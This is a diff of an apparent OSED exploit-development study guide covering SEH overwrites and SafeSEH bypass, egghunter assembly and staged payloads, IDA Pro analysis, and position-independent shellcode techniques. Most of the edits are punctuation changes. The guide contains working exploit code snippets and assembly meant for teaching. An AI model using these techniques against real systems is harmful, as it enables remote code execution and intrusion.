-<p>When the OS dispatches an SEH exception, it pushes several arguments onto the stack before calling the handler. The critical detail is that a pointer to the <code>_EXCEPTION_REGISTRATION_RECORD</code> (which contains the nSEH field the attacker controls) is the second argument on the stack — at <code>ESP+8</code> at the point the handler is called. A <code>POP POP RET</code> gadget removes two DWORDs from the stack, then returns into the address at <code>ESP+8</code>, which is the nSEH field. This redirects execution to the four bytes at the nSEH location, where the attacker places a short jump over the SEH handler address and into the shellcode that follows.</p>
+<p>When the OS dispatches an SEH exception, it pushes several arguments onto the stack before calling the handler. The critical detail is that a pointer to the <code>_EXCEPTION_REGISTRATION_RECORD</code> (which contains the nSEH field the attacker controls) is the second argument on the stack - at <code>ESP+8</code> at the point the handler is called. A <code>POP POP RET</code> gadget removes two DWORDs from the stack, then returns into the address at <code>ESP+8</code>, which is the nSEH field. This redirects execution to the four bytes at the nSEH location, where the attacker places a short jump over the SEH handler address and into the shellcode that follows.</p>
 
-<p>The POP instructions can use any general-purpose register — <code>POP EAX; POP EBX; RET</code>, <code>POP ECX; POP ECX; RET</code>, or any combination. The gadget must come from a module that does not have SafeSEH enabled (or does not participate in the SafeSEH table). Mona automates this search and filters results by SafeSEH, ASLR, and DEP status.</p>
+<p>The POP instructions can use any general-purpose register - <code>POP EAX; POP EBX; RET</code>, <code>POP ECX; POP ECX; RET</code>, or any combination. The gadget must come from a module that does not have SafeSEH enabled (or does not participate in the SafeSEH table). Mona automates this search and filters results by SafeSEH, ASLR, and DEP status.</p>
 
 <table class="custom-table">
 <thead><tr><th>Requirement</th><th>Detail</th></tr></thead>
@@ -1313,7 +1308,7 @@ buf += b"D" * (total_len - len(buf))</code></pre>
 <tr><td>SafeSEH</td><td>Module must NOT be compiled with /SAFESEH or must not appear in the SafeSEH table</td></tr>
 <tr><td>ASLR</td><td>Module should NOT have ASLR enabled (DynamicBase flag off)</td></tr>
 <tr><td>Null bytes</td><td>Gadget address must not contain bad characters (commonly 0x00)</td></tr>
-<tr><td>Module origin</td><td>Prefer application DLLs over OS DLLs — they are more predictable</td></tr>
+<tr><td>Module origin</td><td>Prefer application DLLs over OS DLLs - they are more predictable</td></tr>
 </tbody>
 </table>
 
@@ -1347,18 +1342,18 @@ dd esp L3
 
 <h3 id="nseh-short-jump">3.5 Short Jump and nSEH Payload Layout</h3>
 
-<p>After the POP POP RET gadget executes, EIP lands at the four bytes of the nSEH field on the stack. These four bytes must contain a short jump instruction that leaps over the four-byte SEH handler address into the shellcode that immediately follows. The standard short jump for this purpose is <code>\xEB\x06\x90\x90</code> — a two-byte JMP SHORT +6 followed by two NOPs for alignment. This jumps 6 bytes forward from the end of the JMP instruction: 2 bytes remaining in nSEH + 4 bytes of SEH = 6 bytes, landing directly at the start of the shellcode.</p>
+<p>After the POP POP RET gadget executes, EIP lands at the four bytes of the nSEH field on the stack. These four bytes must contain a short jump instruction that leaps over the four-byte SEH handler address into the shellcode that immediately follows. The standard short jump for this purpose is <code>\xEB\x06\x90\x90</code> - a two-byte JMP SHORT +6 followed by two NOPs for alignment. This jumps 6 bytes forward from the end of the JMP instruction: 2 bytes remaining in nSEH + 4 bytes of SEH = 6 bytes, landing directly at the start of the shellcode.</p>
 
 <p>If space after the SEH handler is too small for the full shellcode, a reverse jump can be used instead. Place the shellcode before the nSEH field in the padding area, and use a negative short jump (<code>\xEB\x80</code> for -128 bytes) or a near jump to reach it. The available jump range for a short jump is -128 to +127 bytes from the end of the instruction.</p>
 
-<p>The EXP-301 course calls this technique "Island-Hopping" — using a chain of short jumps, conditional jumps, and near jumps to navigate through constrained or fragmented buffer space to reach the shellcode. When the overflow splits the payload across non-contiguous regions, island-hopping connects the gaps: a short JMP in nSEH leaps to a small island of controlled space, which contains another JMP (forward or backward) to the next island, eventually reaching a region large enough for the full shellcode. Conditional jumps (JZ, JNZ) can also be used by setting flags with a preceding CMP or TEST instruction.</p>
+<p>The EXP-301 course calls this technique "Island-Hopping" - using a chain of short jumps, conditional jumps, and near jumps to navigate through constrained or fragmented buffer space to reach the shellcode. When the overflow splits the payload across non-contiguous regions, island-hopping connects the gaps: a short JMP in nSEH leaps to a small island of controlled space, which contains another JMP (forward or backward) to the next island, eventually reaching a region large enough for the full shellcode. Conditional jumps (JZ, JNZ) can also be used by setting flags with a preceding CMP or TEST instruction.</p>
 
 <table class="custom-table">
 <thead><tr><th>Payload Offset</th><th>Content</th><th>Size</th><th>Purpose</th></tr></thead>
 <tbody>
 <tr><td>0 to offset-1</td><td>Padding ("A" bytes)</td><td>[nseh-offset]</td><td>Fill buffer up to nSEH</td></tr>
-<tr><td>offset</td><td>\xEB\x06\x90\x90</td><td>4 bytes</td><td>nSEH — short jump over SEH into shellcode</td></tr>
-<tr><td>offset + 4</td><td>POP POP RET address</td><td>4 bytes</td><td>SEH handler — redirects to nSEH</td></tr>
+<tr><td>offset</td><td>\xEB\x06\x90\x90</td><td>4 bytes</td><td>nSEH - short jump over SEH into shellcode</td></tr>
+<tr><td>offset + 4</td><td>POP POP RET address</td><td>4 bytes</td><td>SEH handler - redirects to nSEH</td></tr>
 <tr><td>offset + 8</td><td>NOP sled + shellcode</td><td>Variable</td><td>Payload begins here after the short jump</td></tr>
 </tbody>
 </table>
@@ -1402,7 +1397,7 @@ buf += ppr                                     # SEH: POP POP RET</code></pre>
 
 <h3 id="safeseh-sehop">3.6 SafeSEH and SEHOP Bypass</h3>
 
-<p>SafeSEH is a compile-time protection that embeds a table of valid exception handler addresses into the PE image. When an exception occurs, <code>ntdll!RtlIsValidHandler</code> checks whether the handler address exists in this table. If the handler points to an address inside a SafeSEH-enabled module but is not in the table, the OS refuses to call it and terminates the process. The bypass is to use a POP POP RET gadget from a module that was compiled without SafeSEH — such a module has no handler table, so the validation check is skipped entirely.</p>
+<p>SafeSEH is a compile-time protection that embeds a table of valid exception handler addresses into the PE image. When an exception occurs, <code>ntdll!RtlIsValidHandler</code> checks whether the handler address exists in this table. If the handler points to an address inside a SafeSEH-enabled module but is not in the table, the OS refuses to call it and terminates the process. The bypass is to use a POP POP RET gadget from a module that was compiled without SafeSEH - such a module has no handler table, so the validation check is skipped entirely.</p>
 
 <p>Structured Exception Handler Overwrite Protection (SEHOP) is a runtime mitigation that validates the integrity of the SEH chain before dispatching an exception. SEHOP walks the chain and verifies that the last record's handler points to <code>ntdll!FinalExceptionHandler</code>. If the chain is corrupted (as it would be after an overflow), SEHOP detects the break and terminates the process. SEHOP is enabled by default on Windows Server 2008+ and Windows 10+ but can be disabled on client SKUs. Bypassing SEHOP requires reconstructing a valid chain that passes the walk check, which is significantly harder than SafeSEH bypass.</p>
 
@@ -1447,7 +1442,7 @@ reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v Disa
     <pre><code class="language-bash">!mona seh -n -o -cpb "\x00"</code></pre>
   </li>
   <li>
-    <label><input type="checkbox"> Verify that /GS (stack cookies) does not block the exploit — the exception should trigger before the function epilogue checks the canary</label>
+    <label><input type="checkbox"> Verify that /GS (stack cookies) does not block the exploit - the exception should trigger before the function epilogue checks the canary</label>
     <pre><code class="language-bash">uf [function-address]</code></pre>
     <ul class="methodology-checklist">
     <li><label><input type="checkbox"> Disassemble the vulnerable function's epilogue:</label></li>
@@ -1461,7 +1456,7 @@ reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v Disa
 
 <p>A full SEH exploit combines all the preceding elements: offset calculation, bad character elimination, POP POP RET gadget selection, nSEH short jump, and shellcode placement. The development workflow mirrors vanilla stack overflows but adds the SEH-specific verification steps. After generating shellcode with <code>msfvenom</code>, the complete exploit buffer is assembled and sent to the target. The shellcode must avoid any bad characters identified during testing.</p>
 
-<p>The debugging workflow involves several iterations: send the pattern, calculate the offset, verify control with known values, identify bad characters, generate clean shellcode, and test the final payload. Each step should be validated in WinDbg before moving to the next. Pass the exception to the application with <code>g</code> in WinDbg when the debugger breaks on the access violation — this triggers the SEH chain walk that leads to the POP POP RET and ultimately the shellcode.</p>
+<p>The debugging workflow involves several iterations: send the pattern, calculate the offset, verify control with known values, identify bad characters, generate clean shellcode, and test the final payload. Each step should be validated in WinDbg before moving to the next. Pass the exception to the application with <code>g</code> in WinDbg when the debugger breaks on the access violation - this triggers the SEH chain walk that leads to the POP POP RET and ultimately the shellcode.</p>
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
@@ -1523,22 +1518,21 @@ g
 # Should break at POP POP RET gadget
 t   # step through POP
 t   # step through POP
-t   # step through RET — should land on nSEH (short jump)
-t   # step through JMP — should land in NOP sled
+t   # step through RET - should land on nSEH (short jump)
+t   # step through JMP - should land in NOP sled
 # Verify EIP is in the NOP sled leading to shellcode</code></pre>
   </li>
 </ul>
 
 <!-- ═══════════════════════════════════════════════════════════════════
-     MODULE 4 — Introduction to IDA Pro
+     MODULE 4 - Introduction to IDA Pro
      ═══════════════════════════════════════════════════════════════════ -->
 
 <h2 id="ida-pro">4. Introduction to IDA Pro</h2>
 
 <h3 id="ida-setup">4.1 IDA Pro Setup and Navigation</h3>
 
-<p>IDA Pro is the standard tool for static reverse engineering of compiled binaries. When a binary is loaded, IDA performs auto-analysis — identifying functions, cross-references, strings, and data structures. The analysis phase can take several minutes for large binaries. IDA Free supports x86 and x64 analysis with the cloud decompiler, while IDA Pro includes the local Hex-Rays decompiler for pseudocode generation.</p>
-
+<p>IDA Pro is the standard tool for static reverse engineering of compiled binaries. When a binary is loaded, IDA performs auto-analysis - identifying functions, cross-references, strings, and data structures. The analysis phase can take several minutes for large binaries. IDA Free supports x86 and x64 analysis with the cloud decompiler, while IDA Pro includes the local Hex-Rays decompiler for pseudocode generation.</p>
 <p>The initial load dialog prompts for the processor type (x86, x64, ARM) and whether to load debug symbols. For Windows PE files, IDA automatically selects the correct processor. After auto-analysis completes, the cursor starts at the binary's entry point. Navigation centers on the Functions window (listing all identified functions), the Names window (exported and imported symbols), and the address bar for direct navigation by offset.</p>
 
 <table class="custom-table">
@@ -1558,7 +1552,7 @@ t   # step through JMP — should land in NOP sled
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
   <li>
-    <label><input type="checkbox"> Load the target binary into IDA — select PE format and x86 processor if not auto-detected</label>
+    <label><input type="checkbox"> Load the target binary into IDA - select PE format and x86 processor if not auto-detected</label>
     <ul class="methodology-checklist">
     <li><label><input type="checkbox"> File &gt; Open &gt; select the target executable or DLL</label></li>
     <li><label><input type="checkbox"> Accept default analysis options and wait for auto-analysis to complete</label></li>
@@ -1585,7 +1579,7 @@ t   # step through JMP — should land in NOP sled
   <li>
     <label><input type="checkbox"> Load PDB symbols if available (improves function and variable names)</label>
     <ul class="methodology-checklist">
-    <li><label><input type="checkbox"> <code>File &gt; Load File &gt; PDB File...</code></label></li>
+    <li><label><input type="checkbox"> File &gt; Load File &gt; PDB File...</label></li>
     <li><label><input type="checkbox"> Or set the symbol server path:</label></li>
     <li><label><input type="checkbox"> Options &gt; General &gt; Analysis &gt; PDB &gt; Symbol path:</label></li>
     <li><label><input type="checkbox"> srv*C:\symbols*https://msdl.microsoft.com/download/symbols</label></li>
@@ -1596,8 +1590,9 @@ t   # step through JMP — should land in NOP sled
 <h3 id="ida-views">4.2 IDA Views and Windows</h3>
 
 <p>IDA provides multiple synchronized views of the binary. The disassembly view shows x86 instructions in either linear (flat listing) or graph (control-flow blocks) format. Graph view is particularly useful for understanding branch logic and loop structures in vulnerable functions. The hex view displays raw bytes alongside their ASCII representation, useful for verifying buffer contents and shellcode placement.</p>
+<figure><img src="./img/osed/fig033-graph-view-in-ida-pro.png" alt="Graph view in IDA Pro"></figure>
 
-<p>The Strings window (<code>Shift+F12</code>) lists all identified string constants in the binary — a critical starting point for locating command handlers, error messages, and protocol keywords. The Imports window lists all external API functions the binary calls, revealing which Windows APIs are used (e.g., <code>recv</code>, <code>strcpy</code>, <code>memcpy</code>). The Exports window shows functions the binary makes available to other modules, relevant for DLL analysis.</p>
+<p>The Strings window (<code>Shift+F12</code>) lists all identified string constants in the binary - a critical starting point for locating command handlers, error messages, and protocol keywords. The Imports window lists all external API functions the binary calls, revealing which Windows APIs are used (e.g., <code>recv</code>, <code>strcpy</code>, <code>memcpy</code>). The Exports window shows functions the binary makes available to other modules, relevant for DLL analysis.</p>
 
 <table class="custom-table">
 <thead><tr><th>Window</th><th>Shortcut</th><th>Use Case</th></tr></thead>
@@ -1607,7 +1602,7 @@ t   # step through JMP — should land in NOP sled
 <tr><td>Hex view</td><td>View > Hex dump</td><td>Raw bytes, verifying data layout, shellcode bytes</td></tr>
 <tr><td>Pseudocode</td><td>F5</td><td>C-like decompilation, understanding program logic</td></tr>
 <tr><td>Strings</td><td>Shift+F12</td><td>Finding hardcoded strings, protocol commands, error messages</td></tr>
-<tr><td>Imports</td><td>View > Imports</td><td>External API calls — identifying dangerous functions</td></tr>
+<tr><td>Imports</td><td>View > Imports</td><td>External API calls - identifying dangerous functions</td></tr>
 <tr><td>Exports</td><td>View > Exports</td><td>Functions exported by a DLL</td></tr>
 <tr><td>Structures</td><td>Shift+F9</td><td>Define and apply struct types for readability</td></tr>
 </tbody>
@@ -1659,7 +1654,8 @@ t   # step through JMP — should land in NOP sled
 
 <p>Cross-references (xrefs) are the backbone of binary analysis in IDA. A code xref tracks where a function is called from (call sites) and what functions it calls (callees). A data xref tracks where a variable, string, or buffer is read or written. Pressing <code>X</code> on any symbol shows all locations that reference it, enabling rapid tracing of data flow from input reception to vulnerable operations.</p>
 
-<p>The call graph (View > Graphs > Function calls) provides a visual tree showing all functions that a target function calls (downward) and all functions that call it (upward). This is essential for tracing the path from a network receive function like <code>recv()</code> to a vulnerable <code>strcpy()</code> — the path through the call tree reveals where user input flows and how it reaches the overflow.</p>
+<p>The call graph (View > Graphs > Function calls) provides a visual tree showing all functions that a target function calls (downward) and all functions that call it (upward). This is essential for tracing the path from a network receive function like <code>recv()</code> to a vulnerable <code>strcpy()</code> - the path through the call tree reveals where user input flows and how it reaches the overflow.</p>
+<figure><img src="./img/osed/fig038-graph-overview-window.png" alt="Graph overview window"></figure>
 
 <table class="custom-table">
 <thead><tr><th>Xref Type</th><th>Notation</th><th>Meaning</th></tr></thead>
@@ -1694,7 +1690,7 @@ t   # step through JMP — should land in NOP sled
   <li>
     <label><input type="checkbox"> Generate a call graph from recv() to the vulnerable function</label>
     <ul class="methodology-checklist">
-    <li><label><input type="checkbox"> <code>Right-click the target function &gt; Xrefs graph from...</code></label></li>
+    <li><label><input type="checkbox"> Right-click the target function &gt; Xrefs graph from...</label></li>
     <li><label><input type="checkbox"> Or: View &gt; Graphs &gt; Xrefs from</label></li>
     <li><label><input type="checkbox"> This shows all functions called transitively</label></li>
     <li><label><input type="checkbox"> Look for paths: recv → parse_command → handle_input → strcpy</label></li>
@@ -1703,7 +1699,7 @@ t   # step through JMP — should land in NOP sled
   <li>
     <label><input type="checkbox"> Generate a callers graph to see which higher-level functions invoke the vulnerable routine</label>
     <ul class="methodology-checklist">
-    <li><label><input type="checkbox"> <code>Right-click the function &gt; Xrefs graph to...</code></label></li>
+    <li><label><input type="checkbox"> Right-click the function &gt; Xrefs graph to...</label></li>
     <li><label><input type="checkbox"> Or: View &gt; Graphs &gt; Xrefs to</label></li>
     <li><label><input type="checkbox"> Shows all callers up to the specified depth</label></li>
     <li><label><input type="checkbox"> Identify the entry point that an attacker can reach via network input</label></li>
@@ -1718,7 +1714,7 @@ lm m [module-name]
     <ul class="methodology-checklist">
     <li><label><input type="checkbox"> In IDA: Edit &gt; Segments &gt; Rebase Program</label></li>
     <li><label><input type="checkbox"> Enter the base address from WinDbg (e.g., 0x10000000)</label></li>
-    <li><label><input type="checkbox"> All IDA addresses now match WinDbg — breakpoints set in IDA correspond directly to WinDbg addresses</label></li>
+    <li><label><input type="checkbox"> All IDA addresses now match WinDbg - breakpoints set in IDA correspond directly to WinDbg addresses</label></li>
     </ul>
   </li>
 </ul>
@@ -1736,7 +1732,7 @@ lm m [module-name]
 <tbody>
 <tr><td>strcpy(dst, src)</td><td>No length check on src</td><td>strncpy / strcpy_s</td></tr>
 <tr><td>strcat(dst, src)</td><td>No remaining-space check</td><td>strncat / strcat_s</td></tr>
-<tr><td><code>sprintf(buf, fmt, ...)</code></td><td>No output length limit</td><td><code>snprintf</code> / <code>sprintf_s</code></td></tr>
+<tr><td>sprintf(buf, fmt, ...)</td><td>No output length limit</td><td>snprintf / sprintf_s</td></tr>
 <tr><td>gets(buf)</td><td>No length limit at all</td><td>fgets</td></tr>
 <tr><td>memcpy(dst, src, n)</td><td>Safe only if n is validated</td><td>memcpy_s</td></tr>
 <tr><td>vsprintf(buf, fmt, va)</td><td>No output length limit</td><td>vsnprintf</td></tr>
@@ -1788,7 +1784,7 @@ lm m [module-name]
     <li><label><input type="checkbox"> [ebp+0]    = saved EBP</label></li>
     <li><label><input type="checkbox"> [ebp+4]    = saved EIP (return address)</label></li>
     <li><label><input type="checkbox"> Offset to EIP = 0x108 + 4 = 0x10C = 268 bytes</label></li>
-    <li><label><input type="checkbox"> Offset to SEH = varies — check !exchain after pattern overwrite</label></li>
+    <li><label><input type="checkbox"> Offset to SEH = varies - check !exchain after pattern overwrite</label></li>
     </ul>
   </li>
 </ul>
@@ -1934,20 +1930,20 @@ for func_ea in idautils.Functions():
     frame_size = idc.get_func_attr(func_ea, idc.FUNCATTR_FRSIZE)
     if frame_size > 0x100:
         name = idc.get_func_name(func_ea)
-        print(f"Large frame: {name} at 0x{func_ea:08X} — frame size: 0x{frame_size:X} ({frame_size} bytes)")</code></pre>
+        print(f"Large frame: {name} at 0x{func_ea:08X} - frame size: 0x{frame_size:X} ({frame_size} bytes)")</code></pre>
   </li>
 </ul>
 <!-- ═══════════════════════════════════════════════════════════════════
-     5. Overcoming Space Restrictions — Egghunters
+     5. Overcoming Space Restrictions - Egghunters
      ═══════════════════════════════════════════════════════════════════ -->
 
-<h2 id="egghunters">5. Overcoming Space Restrictions — Egghunters</h2>
+<h2 id="egghunters">5. Overcoming Space Restrictions - Egghunters</h2>
 
 <h3 id="space-restriction">5.1 The Space Restriction Problem</h3>
 
 <p>After overwriting EIP in a stack buffer overflow, the remaining space between the return address and the end of the buffer may be too small to hold a full reverse-shell payload. A typical Meterpreter or custom reverse shell requires 350–500 bytes, but the controllable region after EIP may only offer 30–80 bytes. This space restriction makes direct shellcode placement impossible.</p>
 
-<p>Before giving up on a target, examine the entire process memory at the time of the crash. The full input may be stored in another location — an earlier field in the protocol, a heap allocation, or a separate buffer on the stack. The goal is to identify any region that holds attacker-controlled data and has enough room for the final payload.</p>
+<p>Before giving up on a target, examine the entire process memory at the time of the crash. The full input may be stored in another location - an earlier field in the protocol, a heap allocation, or a separate buffer on the stack. The goal is to identify any region that holds attacker-controlled data and has enough room for the final payload.</p>
 
 <table class="custom-table">
 <thead><tr><th>Scenario</th><th>Available Space</th><th>Solution</th></tr></thead>
@@ -1973,7 +1969,7 @@ for func_ea in idautils.Functions():
   <li>
     <label><input type="checkbox"> Search the entire address space for other instances of the input pattern</label>
     <pre><code class="language-bash">0:000> s -a 0x00000000 L?0x7fffffff "AAAA"
-# Look for large contiguous blocks — these can hold the second-stage payload</code></pre>
+# Look for large contiguous blocks - these can hold the second-stage payload</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Measure each candidate buffer to confirm it can hold the full shellcode</label>
@@ -1986,9 +1982,9 @@ pattern = b"A" * 2000  # Send a recognizable pattern
 
 <h3 id="egg-concept">5.2 Egg Concept and Staged Payloads</h3>
 
-<p>An egg is a unique 4-byte marker that is repeated twice (8 bytes total) and prepended to the second-stage shellcode. The egghunter — a small first-stage payload (~32 bytes) — scans the entire process address space looking for this 8-byte sequence. When it finds the marker, it jumps to the code immediately following it, executing the full shellcode.</p>
+<p>An egg is a unique 4-byte marker that is repeated twice (8 bytes total) and prepended to the second-stage shellcode. The egghunter - a small first-stage payload (~32 bytes) - scans the entire process address space looking for this 8-byte sequence. When it finds the marker, it jumps to the code immediately following it, executing the full shellcode.</p>
 
-<p>The egg must be unique enough that it does not appear naturally in process memory. Common choices include <code>w00t</code> (0x74303077) or <code>c0d3</code> (0x33643063). The tag is repeated twice because the egghunter itself contains one copy of the tag — if it only searched for a single instance, it could find itself instead of the actual payload.</p>
+<p>The egg must be unique enough that it does not appear naturally in process memory. Common choices include <code>w00t</code> (0x74303077) or <code>c0d3</code> (0x33643063). The tag is repeated twice because the egghunter itself contains one copy of the tag - if it only searched for a single instance, it could find itself instead of the actual payload.</p>
 
 <table class="custom-table">
 <thead><tr><th>Component</th><th>Size</th><th>Location</th><th>Purpose</th></tr></thead>
@@ -2012,7 +2008,7 @@ egg_marker = egg * 2   # 8 bytes prepended to shellcode: w00tw00t</code></pre>
 # Should return zero results before the exploit runs</code></pre>
   </li>
   <li>
-    <label><input type="checkbox"> Construct the staged payload — egg+shellcode in the large buffer, egghunter in the small buffer</label>
+    <label><input type="checkbox"> Construct the staged payload - egg+shellcode in the large buffer, egghunter in the small buffer</label>
     <pre><code class="language-python">import struct
 
 egg = b"w00t"
@@ -2050,7 +2046,7 @@ first_stage = egghunter</code></pre>
 <tr><td><code>jnz next_byte</code></td><td>If no match, advance to the next address</td></tr>
 <tr><td><code>scasd</code></td><td>Check second copy of the tag</td></tr>
 <tr><td><code>jnz next_byte</code></td><td>If no match, keep searching</td></tr>
-<tr><td><code>jmp edi</code></td><td>EDI now points past the egg — jump to the shellcode</td></tr>
+<tr><td><code>jmp edi</code></td><td>EDI now points past the egg - jump to the shellcode</td></tr>
 </tbody>
 </table>
 
@@ -2084,7 +2080,7 @@ first_stage = egghunter</code></pre>
 
 <p>The NtAccessCheckAndAuditAlarm egghunter compiles to approximately 32 bytes. Writing it in NASM and assembling it into raw bytes produces a compact first-stage payload that fits in almost any buffer space constraint. Every instruction must avoid null bytes since the egghunter is typically delivered through string-based input.</p>
 
-<pre><code class="language-c">; egghunter.asm — NtAccessCheckAndAuditAlarm egghunter (32 bytes)
+<pre><code class="language-c">; egghunter.asm - NtAccessCheckAndAuditAlarm egghunter (32 bytes)
 ; Egg tag: w00t (0x74303077)
 
 next_page:
@@ -2106,7 +2102,7 @@ next_byte:
     jnz next_byte          ; first tag not found, next byte
     scasd                  ; compare second tag
     jnz next_byte          ; second tag not found, next byte
-    jmp edi                ; egg found — jump past both tags into shellcode</code></pre>
+    jmp edi                ; egg found - jump past both tags into shellcode</code></pre>
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
@@ -2167,7 +2163,7 @@ xxd -i egghunter.bin</code></pre>
   <li>
     <label><input type="checkbox"> Verify the egghunter contains no null bytes</label>
     <pre><code class="language-python">if b"\x00" in egghunter:
-    print("[!] Egghunter contains null bytes — fix required")
+    print("[!] Egghunter contains null bytes - fix required")
 else:
     print(f"[+] Egghunter is clean, {len(egghunter)} bytes")</code></pre>
   </li>
@@ -2186,14 +2182,14 @@ egghunter_asm = """
     int 0x2e            ;
     cmp al, 0x05        ;
     pop edx             ;
-    je start            ; PAGE_NOACCESS — next page
+    je start            ; PAGE_NOACCESS - next page
     mov eax, 0x50303050 ; egg tag
     mov edi, edx        ;
     scasd               ;
-    jnz start+3         ; no match — inc edx and retry
+    jnz start+3         ; no match - inc edx and retry
     scasd               ;
     jnz start+3         ;
-    jmp edi             ; egg found — jump to shellcode
+    jmp edi             ; egg found - jump to shellcode
 """
 
 encoding, count = ks.asm(egghunter_asm)
@@ -2206,7 +2202,7 @@ print(f"[+] Keystone assembled {count} instructions, {len(egghunter)} bytes")</c
 
 <h3 id="egghunter-stack">5.5 Egghunter in Stack Overflow Exploits</h3>
 
-<p>In a standard stack overflow exploit with limited post-EIP space, the egghunter is placed in the small buffer immediately after the return address. EIP is overwritten with a <code>JMP ESP</code> gadget address so execution lands on the egghunter. The second-stage payload (egg marker + shellcode) is placed in a different part of the input — for example, in an earlier field, a separate protocol command, or the beginning of the same buffer (before the EIP overwrite offset).</p>
+<p>In a standard stack overflow exploit with limited post-EIP space, the egghunter is placed in the small buffer immediately after the return address. EIP is overwritten with a <code>JMP ESP</code> gadget address so execution lands on the egghunter. The second-stage payload (egg marker + shellcode) is placed in a different part of the input - for example, in an earlier field, a separate protocol command, or the beginning of the same buffer (before the EIP overwrite offset).</p>
 
 <p>The exploit must ensure that the second-stage buffer is still in memory and accessible when the egghunter runs. If the application processes input in stages and discards earlier data, the egg may no longer be present. Testing the full exploit flow end-to-end in WinDbg is essential to confirm both the egghunter and the egg are in memory simultaneously.</p>
 
@@ -2275,7 +2271,7 @@ s.close()</code></pre>
 
 <h3 id="egghunter-seh">5.6 Egghunter in SEH Exploits</h3>
 
-<p>SEH exploits offer even less space for shellcode because the layout requires the nSEH field (4 bytes) and SE handler (4 bytes) to be at specific offsets. After the POP POP RET gadget executes and control returns to nSEH, only the space between nSEH and the end of the overwritten buffer is available. A short jump in nSEH (EB 06 or similar) skips over the SE handler bytes and lands in this limited area — exactly where the egghunter goes.</p>
+<p>SEH exploits offer even less space for shellcode because the layout requires the nSEH field (4 bytes) and SE handler (4 bytes) to be at specific offsets. After the POP POP RET gadget executes and control returns to nSEH, only the space between nSEH and the end of the overwritten buffer is available. A short jump in nSEH (EB 06 or similar) skips over the SE handler bytes and lands in this limited area - exactly where the egghunter goes.</p>
 
 <p>The second-stage payload (egg + shellcode) is placed in an earlier part of the buffer or a different input field. The nSEH short jump lands on the egghunter, which scans memory until it finds the egg, then redirects execution to the full payload.</p>
 
@@ -2361,7 +2357,7 @@ s.close()</code></pre>
 # Look for: mov eax, [syscall-number]
 
 0:000> u ntdll!NtDisplayString
-# Alternative syscall — look for mov eax, [syscall-number]</code></pre>
+# Alternative syscall - look for mov eax, [syscall-number]</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Update the egghunter assembly with the correct syscall number for the target OS</label>
@@ -2393,7 +2389,7 @@ s.close()</code></pre>
 <ul class="methodology-checklist">
   <li>
     <label><input type="checkbox"> Modify the egghunter to start from ESP (stack-biased scan)</label>
-    <pre><code class="language-c">; Stack-biased egghunter — start scanning from near ESP
+    <pre><code class="language-c">; Stack-biased egghunter - start scanning from near ESP
     mov edx, esp           ; start from current stack pointer
     sub edx, 0x1000        ; back up one page for safety
 next_page:
@@ -2419,7 +2415,7 @@ next_page:
 0:000> g
 # Note timestamp at first breakpoint
 0:000> g
-# Note timestamp at second breakpoint — difference is egghunter scan time</code></pre>
+# Note timestamp at second breakpoint - difference is egghunter scan time</code></pre>
   </li>
 </ul>
 
@@ -2431,7 +2427,7 @@ next_page:
 
 <h3 id="pic-concept">6.1 Position-Independent Code</h3>
 
-<p>Shellcode must execute correctly regardless of where in memory it is loaded. This means it cannot contain absolute addresses — every memory reference must be relative to the current instruction pointer. The fundamental technique for obtaining the current EIP in x86 is the <code>CALL/POP</code> pattern: a <code>CALL</code> instruction pushes the address of the next instruction onto the stack, and a subsequent <code>POP</code> retrieves it into a register.</p>
+<p>Shellcode must execute correctly regardless of where in memory it is loaded. This means it cannot contain absolute addresses - every memory reference must be relative to the current instruction pointer. The fundamental technique for obtaining the current EIP in x86 is the <code>CALL/POP</code> pattern: a <code>CALL</code> instruction pushes the address of the next instruction onto the stack, and a subsequent <code>POP</code> retrieves it into a register.</p>
 
 <p>The JMP-CALL-POP technique is the standard idiom for position-independent data references. A <code>JMP</code> instruction at the start of the shellcode jumps forward past the data, landing on a <code>CALL</code> instruction that calls backward to the code right after the initial <code>JMP</code>. This <code>CALL</code> pushes the address of the data (which sits between the <code>CALL</code> target and the <code>CALL</code> itself) onto the stack, where a <code>POP</code> instruction retrieves it.</p>
 
@@ -2439,7 +2435,7 @@ next_page:
 <thead><tr><th>Technique</th><th>Instructions</th><th>Purpose</th></tr></thead>
 <tbody>
 <tr><td>CALL/POP</td><td><code>call label; label: pop reg</code></td><td>Get EIP into a register</td></tr>
-<tr><td>JMP-CALL-POP</td><td><code>jmp fwd; code: pop reg; instructions; fwd: call code; db "data"</code></td><td>Reference data at known offset from EIP</td></tr>
+<tr><td>JMP-CALL-POP</td><td><code>jmp fwd; code: pop reg; ...; fwd: call code; db "data"</code></td><td>Reference data at known offset from EIP</td></tr>
 <tr><td>Relative LEA</td><td><code>call delta; delta: pop ebx; lea eax, [ebx+offset]</code></td><td>Compute address of a label relative to current position</td></tr>
 <tr><td>FSTENV</td><td><code>fldz; fstenv [esp-0x0c]; pop reg</code></td><td>Get EIP via FPU environment save (alternative to CALL/POP)</td></tr>
 </tbody>
@@ -2481,6 +2477,7 @@ call_shellcode:
 <h3 id="kernel32-base">6.2 Locating kernel32.dll Base Address</h3>
 
 <p>Every Windows process loads <code>kernel32.dll</code>, which exports essential functions like <code>GetProcAddress</code>, <code>LoadLibraryA</code>, and <code>VirtualAlloc</code>. To call these functions from shellcode, the base address of kernel32 must be resolved at runtime. The standard technique walks the Process Environment Block (PEB) structures maintained by the Windows loader.</p>
+<figure><img src="./img/osed/fig067-eat-function-vma.png" alt="EAT function VMA"></figure>
 
 <p>On 32-bit Windows, the Thread Environment Block (TEB) is accessible at <code>fs:[0x00]</code>, and the PEB pointer is at <code>fs:[0x30]</code>. The PEB contains a pointer to the <code>PEB_LDR_DATA</code> structure at offset 0x0C, which maintains three doubly-linked lists of loaded modules. The <code>InMemoryOrderModuleList</code> (at offset 0x14 within PEB_LDR_DATA) lists modules in the order they were loaded into memory. The first entry is typically the executable itself, the second is <code>ntdll.dll</code>, and the third is <code>kernel32.dll</code>.</p>
 
@@ -2523,7 +2520,7 @@ next_module:
   <li>
     <label><input type="checkbox"> Alternatively, verify by dumping the InMemoryOrderModuleList</label>
     <pre><code class="language-bash">0:000> !peb
-# Lists all loaded modules — note kernel32.dll base address
+# Lists all loaded modules - note kernel32.dll base address
 0:000> lm m kernel32
